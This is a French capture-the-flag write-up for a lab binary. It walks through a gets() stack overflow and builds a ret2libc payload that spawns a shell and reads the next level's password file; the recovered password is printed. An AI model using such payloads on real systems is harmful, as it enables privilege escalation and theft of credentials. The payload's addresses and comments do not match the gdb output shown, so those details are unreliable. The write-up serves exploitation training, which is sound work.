Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```
$ id && pwd && ls -la
uid=2021(level2) gid=2021(level2) groups=2021(level2),100(users)
/home/user/level2
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire level2 :

```
$ ./level2

```

Il ne répond qu'avec un input :

```
$ ./level2
da
da
```

Je décide à partir de ce niveau d'utiliser les logiciels de décompilation présent sur [Dogbolt](https://dogbolt.org/?id=4128e95e-4279-47df-81a9-a69c5f209d01).

En lui passant le binaire au préalable téléchargé, `Ghidra` me procure le code suivant :

```c
void p() {
  uint unaff_retaddr;
  char buffer[76];
  
  fflush(stdout);
  gets(buffer);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n", unaff_retaddr);
                    // WARNING: Subroutine does not return
    _exit(1);
  }
  puts(buffer);
  strdup(buffer);
  return;
}

void main(void) {
  p();
  return;
}
```

J'identifie :

- une vulnérabilité possible avec `gets()`
- la mise en place d'un 'safeguard' avec une condition if

`Dogbolt` me propose aussi la version d'`Hexray` :

```c
char *p() {
  char s[64]; // [esp+1Ch] [ebp-4Ch] BYREF
  const void *v2; // [esp+5Ch] [ebp-Ch]
  unsigned int retaddr; // [esp+6Ch] [ebp+4h]

  fflush(stdout);
  gets(s);
  v2 = (const void *)retaddr;
  if ( (retaddr & 0xB0000000) == -1342177280 )
  {
    printf("(%p)\n", v2);
    _exit(1);
  }
  puts(s);
  return strdup(s);
}
```

Etant donné qu'aucun appel à `exec` ne semble être fait dans l'ensemble du code décompilé, je me penche sur un type d'attaque appellé [Ret2Libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc) et y trouve un schéma explicatif décrivant l'aspect du payload infecté nécessaire.

Afin d'exploiter `gets()`, je note d'abord que le buffer 'non-exploitable' est de 76 bytes d'après l'analyse par `Ghidra`.

Je note que la version d'`Hexray` spécifie que :

```c
unsigned int retaddr; // [esp+6Ch] [ebp+4h]
```

La partie `ebp+4` m'indique que la valeur de `retaddr` se trouve à `ebp + 4`.

`ebp` correspondant à un pointeur sur la frame de la stack actuelle, cela signifie que l'adresse de retour de `p` se trouve 4 bytes plus loin que `ebp`. Je dois donc ajouter 4 bytes à mon payload infecté afin qu'il fasse 80 bytes, et que les 4 prochains pointent sur `retaddr`.

Je compose donc mon payload infecté avec les informations suivantes :

- 80 bytes de `NOP` (`\x90`) qui correspondent à des instructions de ne rien faire et s'assure du bon alignement de la mémoire

- L'adresse de retour de `p` (trouvé avec `gdb` puis `disas main`) : `0x0804853e`

- Une adresse vers `system()` dans la `libc`

- Une adresse vers `exit()` dans la `libc`

- Une adresse vers `"bin/sh"` dans la `libc`


Pour trouver les trois dernières adresses, j'utilise `gdb` après avoir mis un `breakpoint` et avoir lancé le programme, afin de regarder sa mémoire :

```
# System
(gdb) info function system
0x08048360  system
0x08048360  system@plt
...

# Exit
(gdb) info function exit
0xb7e5ebe0  exit
...

# /bin/sh
(gdb) info proc mappings
...
0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
...
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
```

Je construis mon payload en utilisant python, y ajoute une lecture du `.pass` du level3, et enfin le passe à l'executable `level2` :

```python
(python -c 'print("\x90"*80
+ "\x08\x04\x85\x3e"[::-1] # <- return address of p [::-1] is an inverted splice
+ "\xb7\xe6\xb0\x60"[::-1] # <- return address of exit
+ "\x08\x04\x83\xd0"[::-1] # <- return address of system
+ "\xb7\xf8\xcc\x58"[::-1] # <- return address of "bin/sh"
)' && echo 'cat /home/user/level3/.pass') | ./level2

492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

